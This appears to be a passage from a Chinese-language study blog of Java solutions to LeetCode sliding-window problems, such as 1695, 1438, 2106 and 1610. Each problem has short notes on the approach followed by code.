<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[right] == <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">while</span>(left &lt;= right &amp;&amp; count &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[left] == <span class="number">0</span>) count--;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, right - left);</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2730-找到最长的半重复子字符串"><a href="#2730-找到最长的半重复子字符串" class="headerlink" title="2730. 找到最长的半重复子字符串"></a><a href="https://leetcode.cn/problems/find-the-longest-semi-repetitive-substring/">2730. 找到最长的半重复子字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestSemiRepetitiveSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (right &gt; <span class="number">0</span> &amp;&amp; s.charAt(right) == s.charAt(right - <span class="number">1</span>)) count++;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; count &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (left &lt; n - <span class="number">1</span> &amp;&amp; s.charAt(left) == s.charAt(left + <span class="number">1</span>)) count--;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1695-删除子数组的最大得分"><a href="#1695-删除子数组的最大得分" class="headerlink" title="1695. 删除子数组的最大得分"></a><a href="https://leetcode.cn/problems/maximum-erasure-value/">1695. 删除子数组的最大得分</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumUniqueSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            map.merge(nums[right], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            sum += nums[right];</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; map.get(nums[right]) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                sum -= nums[left];</span><br><span class="line">                map.merge(nums[left++], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2958-最多-K-个重复元素的最长子数组"><a href="#2958-最多-K-个重复元素的最长子数组" class="headerlink" title="2958. 最多 K 个重复元素的最长子数组"></a><a href="https://leetcode.cn/problems/length-of-longest-subarray-with-at-most-k-frequency/">2958. 最多 K 个重复元素的最长子数组</a></h3><p>经典滑动窗口，感觉跟前面都像是一个题。。。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubarrayLength</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            map.merge(nums[right], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">while</span>(left &lt;= right &amp;&amp; map.get(nums[right]) &gt; k)&#123;</span><br><span class="line">                map.merge(nums[left++], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1438-绝对差不超过限制的最长连续子数组"><a href="#1438-绝对差不超过限制的最长连续子数组" class="headerlink" title="1438. 绝对差不超过限制的最长连续子数组"></a><a href="https://leetcode.cn/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/">1438. 绝对差不超过限制的最长连续子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口</span><br><span class="line">用TreeSet 维护大小 或者单调队列维护</span><br><span class="line">这里写单调队列维护吧（熟悉下单调队列）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestSubarray</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> limit)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; maxQueue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;Integer&gt; minQueue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!maxQueue.isEmpty() &amp;&amp; nums[right] &gt; maxQueue.peekLast()) &#123;</span><br><span class="line">                maxQueue.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!minQueue.isEmpty() &amp;&amp; nums[right] &lt; minQueue.peekLast()) &#123;</span><br><span class="line">                minQueue.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            maxQueue.add(nums[right]);</span><br><span class="line">            minQueue.add(nums[right]);</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; Integer.max(maxQueue.peek() - nums[right], nums[right] - minQueue.peek()) &gt; limit) &#123;</span><br><span class="line">                <span class="keyword">if</span>(maxQueue.peek() == nums[left]) maxQueue.poll();</span><br><span class="line">                <span class="keyword">if</span>(minQueue.peek() == nums[left]) minQueue.poll();</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(right - left + <span class="number">1</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2401-最长优雅子数组"><a href="#2401-最长优雅子数组" class="headerlink" title="2401. 最长优雅子数组"></a><a href="https://leetcode.cn/problems/longest-nice-subarray/">2401. 最长优雅子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">仍然是滑动窗口，不过涉及位运算</span><br><span class="line">没有相同位等价与 (A + B) == (A | B)</span><br><span class="line">..............其实有个更简洁的写法 A&amp;B!=0 hhh</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestNiceSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; (nums[right] | preSum) != nums[right] + preSum) &#123;</span><br><span class="line">                preSum -= nums[left];</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            preSum += nums[right];</span><br><span class="line">            res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1658-将-x-减到-0-的最小操作数"><a href="#1658-将-x-减到-0-的最小操作数" class="headerlink" title="1658. 将 x 减到 0 的最小操作数"></a><a href="https://leetcode.cn/problems/minimum-operations-to-reduce-x-to-zero/">1658. 将 x 减到 0 的最小操作数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">等价于求和得到sum 。然后找子数组中满足和为 sum - x的值。</span><br><span class="line">这里分析一下能不能滑动（题单内肯定能滑动了还是分析下）</span><br><span class="line">对于固定i</span><br><span class="line">如果nums[i] + ......nums[j] &gt; target 那么肯定j及其在大的肯定不满足条件</span><br><span class="line">对于固定 j</span><br><span class="line">如果nums[i] + ......nums[j] &gt; target 那么肯定i及其在小的肯定不满足条件</span><br><span class="line">所以能滑动</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minOperations</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NUMS_SUM</span> <span class="operator">=</span> Arrays.stream(nums).sum();</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> NUMS_SUM - x;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//获得最长子数组</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            sum += nums[right];</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; sum &gt; target)&#123;</span><br><span class="line">                sum -= nums[left++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(sum == target) res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res == -<span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> n - res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1838-最高频元素的频数"><a href="#1838-最高频元素的频数" class="headerlink" title="1838. 最高频元素的频数"></a><a href="https://leetcode.cn/problems/frequency-of-the-most-frequent-element/">1838. 最高频元素的频数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序加滑动窗口</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxFrequency</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">1</span>; right &lt; n; right++) &#123;</span><br><span class="line">            count += (<span class="type">long</span>) (nums[right] - nums[right - <span class="number">1</span>]) * (right - left);</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; count &gt; k) &#123;</span><br><span class="line">                count -= (nums[right] - nums[left++]);</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2516-每种字符至少取-K-个"><a href="#2516-每种字符至少取-K-个" class="headerlink" title="2516. 每种字符至少取 K 个"></a><a href="https://leetcode.cn/problems/take-k-of-each-character-from-left-and-right/">2516. 每种字符至少取 K 个</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逆向思维，跟前面代码差不多，直接抄题解了（sorry）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int takeCharacters(String s, int k) &#123;</span><br><span class="line">        int cnta = 0;</span><br><span class="line">        int cntb = 0;</span><br><span class="line">        int cntc = 0;</span><br><span class="line">        for(char ch : s.toCharArray())&#123;</span><br><span class="line">            if(ch == &#x27;a&#x27;)&#123;</span><br><span class="line">                cnta++;</span><br><span class="line">            &#125;else if(ch == &#x27;b&#x27;)&#123;</span><br><span class="line">                cntb++;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                cntc++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int ans = -1;</span><br><span class="line">        int l = 0;</span><br><span class="line">        int curCnta = 0;</span><br><span class="line">        int curCntb = 0;</span><br><span class="line">        int curCntc = 0;</span><br><span class="line">        for(int r = 0; r &lt; s.length(); r++)&#123;</span><br><span class="line">            if(s.charAt(r) == &#x27;a&#x27;)&#123;</span><br><span class="line">                curCnta++;</span><br><span class="line">            &#125;else if(s.charAt(r) == &#x27;b&#x27;)&#123;</span><br><span class="line">                curCntb++;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                curCntc++;</span><br><span class="line">            &#125;</span><br><span class="line">            while(l &lt; s.length() &amp;&amp; (curCnta &gt; cnta-k || curCntb &gt; cntb-k || curCntc &gt; cntc-k))&#123;</span><br><span class="line">                if(s.charAt(l) == &#x27;a&#x27;)&#123;</span><br><span class="line">                    curCnta--;</span><br><span class="line">                &#125;else if(s.charAt(l) == &#x27;b&#x27;)&#123;</span><br><span class="line">                    curCntb--;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    curCntc--;</span><br><span class="line">                &#125;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            if(curCnta &lt;= cnta - k &amp;&amp; curCntb &lt;= cntb - k &amp;&amp; curCntc &lt;= cntc - k)&#123;</span><br><span class="line">                ans = Math.max(ans, r-l+1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans == -1 ? ans : s.length()-ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2831-找出最长等值子数组"><a href="#2831-找出最长等值子数组" class="headerlink" title="2831. 找出最长等值子数组"></a><a href="https://leetcode.cn/problems/find-the-longest-equal-subarray/">2831. 找出最长等值子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相同数字分组保存下标记</span><br><span class="line">滑动窗口</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestEqualSubarray</span><span class="params">(List&lt;Integer&gt; nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Map&lt;Integer, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            map.computeIfAbsent(nums.get(i), x -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, List&lt;Integer&gt;&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            List&lt;Integer&gt; list = entry.getValue();</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; list.size(); right++) &#123;</span><br><span class="line">                <span class="comment">// count = list.get(right) - list.get(left) - (right - left - 1);</span></span><br><span class="line">                <span class="keyword">while</span> (left &lt;= right &amp;&amp; list.get(right) - list.get(left) - <span class="number">1</span> - (right - left - <span class="number">1</span>) &gt; k) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//list.get(right) - list.get(left) - (right - left - 1) 这个式子在left = right 是错误的，不过我们预先设置res = 1，无所谓了</span></span><br><span class="line">                res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2106-摘水果"><a href="#2106-摘水果" class="headerlink" title="2106. 摘水果"></a><a href="https://leetcode.cn/problems/maximum-fruits-harvested-after-at-most-k-steps/">2106. 摘水果</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有四种情况</span><br><span class="line">1、一直向左，最终位置 startPos - k</span><br><span class="line">2、一直向右，最终位置 startPos - k</span><br><span class="line">3、先向右，在向左（需保证最终位置在初始位置左边，否则肯定不如情况2）</span><br><span class="line">4、先向左，在向右（需保证最终位置在初始位置右边，否则肯定不如情况1）</span><br><span class="line">情况进行拆分</span><br><span class="line">记向右走的步数为x，向左走的步数为y</span><br><span class="line">则有 x + y = k</span><br><span class="line">先向右在向左走最终坐标(startPos + x - y),能吃到的范围 [min(startPos, startPos + x - y), startPos + x]</span><br><span class="line">先向左在向右走最终坐标(startPos + x - y),能吃到的范围 [ startPos - y, max(startPos, startPos + x - y)]</span><br><span class="line"></span><br><span class="line">怎样减少计算量呢，我们可以前缀和 + 二分减少计算量 （花点时间调调应该还是能写出来，懒得写了）</span><br><span class="line"></span><br><span class="line">但是这道题咋滑啊，看看题解，贴贴idea，然后自己实现下</span><br><span class="line">https://leetcode.cn/problems/maximum-fruits-harvested-after-at-most-k-steps/solutions/2254268/zhai-shui-guo-by-leetcode-solution-4j9v/</span><br><span class="line">idea：将四步合并成一个式子，然后发现能够滑动</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxTotalFruits</span><span class="params">(<span class="type">int</span>[][] fruits, <span class="type">int</span> startPos, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> fruits.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            sum += fruits[right][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span>(left &lt;= right &amp;&amp; calStep(startPos, fruits, left, right) &gt; k)&#123;</span><br><span class="line">                sum -= fruits[left++][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left &lt;= right&amp;&amp;calStep(startPos, fruits, left, right) &lt;= k)&#123;</span><br><span class="line">                res = Math.max(res, sum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">calStep</span><span class="params">(<span class="type">int</span> startPos, <span class="type">int</span>[][] fruits, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fruits[right][<span class="number">0</span>] - fruits[left][<span class="number">0</span>] + Math.min(Math.abs(startPos - fruits[right][<span class="number">0</span>]),Math.abs(startPos - fruits[left][<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1610-可见点的最大数目"><a href="#1610-可见点的最大数目" class="headerlink" title="1610. 可见点的最大数目"></a><a href="https://leetcode.cn/problems/maximum-number-of-visible-points/">1610. 可见点的最大数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">按照角度排序，然后跟着点慢慢转角度。但要运用数学知识，不太会，学下</span><br><span class="line"></span><br><span class="line">实际也不难，主要是求极角，不管了，直接cv</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">double</span> <span class="variable">eps</span> <span class="operator">=</span> <span class="number">1e-9</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">visiblePoints</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; points, <span class="type">int</span> angle, List&lt;Integer&gt; location)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> location.get(<span class="number">0</span>), y = location.get(<span class="number">1</span>);</span><br><span class="line">        List&lt;Double&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">pi</span> <span class="operator">=</span> Math.PI, t = angle * pi / <span class="number">180</span>;</span><br><span class="line">        <span class="keyword">for</span> (List&lt;Integer&gt; p : points) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> p.get(<span class="number">0</span>), b = p.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (a == x &amp;&amp; b == y &amp;&amp; ++cnt &gt;= <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            list.add(Math.atan2(b - y, a - x) + pi);</span><br><span class="line">        &#125;</span><br><span class="line">        Collections.sort(list);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> list.size(), max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) list.add(list.get(i) + <span class="number">2</span> * pi);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>; j &lt; <span class="number">2</span> * n; j++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; list.get(j) - list.get(i) &gt; t + eps) i++;</span><br><span class="line">            max = Math.max(max, j - i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt + max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2781-最长合法子字符串的长度"><a href="#2781-最长合法子字符串的长度" class="headerlink" title="2781. 最长合法子字符串的长度"></a><a href="https://leetcode.cn/problems/length-of-the-longest-valid-substring/">2781. 最长合法子字符串的长度</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestValidSubstring</span><span class="params">(String word, List&lt;String&gt; forbidden)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> word.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        Set&lt;String&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String s : forbidden) &#123;</span><br><span class="line">            set.add(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//[left,right]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            right = Integer.max(right, left - <span 